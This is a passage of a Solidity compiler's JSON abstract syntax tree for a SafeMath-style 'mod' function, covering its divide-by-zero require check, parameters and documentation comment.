															"argumentTypes": null,
															"id": 415,
															"name": "errorMessage",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 406,
															"src": "5166:12:2",
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 411,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															-18,
															-18
														],
														"referencedDeclaration": -18,
														"src": "5150:7:2",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 416,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "5150:29:2",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 417,
												"nodeType": "ExpressionStatement",
												"src": "5150:29:2"
											},
											{
												"expression": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 420,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 418,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 402,
														"src": "5196:1:2",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "%",
													"rightExpression": {
														"argumentTypes": null,
														"id": 419,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 404,
														"src": "5200:1:2",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "5196:5:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 410,
												"id": 421,
												"nodeType": "Return",
												"src": "5189:12:2"
											}
										]
									},
									"documentation": {
										"id": 400,
										"nodeType": "StructuredDocumentation",
										"src": "4587:453:2",
										"text": " @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n Reverts with custom message when dividing by zero.\n Counterpart to Solidity's `%` operator. This function uses a `revert`\n opcode (which leaves remaining gas untouched) while Solidity uses an\n invalid opcode to revert (consuming all remaining gas).\n Requirements:\n - The divisor cannot be zero."
									},
									"id": 423,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "mod",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 407,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 402,
												"mutability": "mutable",
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 423,
												"src": "5058:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 401,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "5058:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 404,
												"mutability": "mutable",
												"name": "b",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 423,
												"src": "5069:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 403,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "5069:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 406,
												"mutability": "mutable",
												"name": "errorMessage",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 423,
												"src": "5080:26:2",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 405,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "5080:6:2",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "5057:50:2"
									},
									"returnParameters": {
										"id": 410,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 409,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 423,
												"src": "5131:7:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 408,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "5131:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "5130:9:2"
									},
									"scope": 424,
									"src": "5045:163:2",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								}
							],
							"scope": 425,
							"src": "622:4588:2"
						}
					],
					"src": "33:5178:2"
				},
				"id": 2
			}
		}
	}
}